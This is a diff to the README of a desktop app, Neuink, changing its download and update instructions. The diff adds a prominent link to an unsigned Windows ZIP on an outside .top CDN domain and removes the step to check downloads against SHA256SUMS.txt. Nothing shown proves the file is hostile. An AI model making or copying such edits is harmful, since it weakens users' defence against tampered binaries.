@@ -6,12 +6,16 @@
 
 ## Downloads and updates
 
+**[Download Windows x64 portable ZIP (CDN)](https://cdn.sugrsertraline.top/Neuink-windows-x64-portable.zip)**
+
+Fully extract the ZIP, keep the bundled resource folders, and run `Neuink.exe`. Do not run it from inside the archive.
+
 - [Published releases](https://github.com/SugrSertraline/neuink/releases): check the release date and notes. Download `Neuink-windows-x64-portable.zip`, not GitHub's Source code archive. The old Beta 1 executable does not represent current main-branch features.
 - [Development builds](https://github.com/SugrSertraline/neuink/actions/workflows/windows-portable.yml): open a successful `main` run and download its commit-labelled artifact (GitHub sign-in required; retained for 14 days). Artifacts become available only after the workflow has been pushed and completed successfully.
 - Extract the artifact, then fully extract the portable ZIP and run `Neuink.exe`. Windows 10 1903+/11 x64 and WebView2 are required. Windows builds are currently unsigned.
 - macOS preview builds: use `Neuink-macos-arm64.app.zip` for Apple Silicon or `Neuink-macos-x64.app.zip` for Intel, extract and move `Neuink.app` to Applications. Embedding is inside the app bundle, while user data is separate. Builds are ad-hoc signed, not notarized, and may be blocked by Gatekeeper; do not disable system security globally. Native Mac validation is pending. Windows-only embedded browser and video subtitle runtime have not been ported. Downloads appear only after successful cloud builds.
 - Packages include embedding resources and browser-reading dependencies. Demo assets are optional: consult `build-info.json` (`demoIncluded`). Cloud builds omit the untracked tutorial paper by default.
-- Back up your workspace, close the old app, and extract updates to a new folder. Do not delete your workspace. Verify the source commit in `build-info.json` and download integrity with `SHA256SUMS.txt`.
+- Back up your workspace, close the old app, and extract updates to a new folder. Do not delete your workspace. Verify the source commit in `build-info.json`.
 
 Main-branch pushes run tests and build artifacts; version tags create reviewable Release drafts rather than automatically publishing untested releases.
 
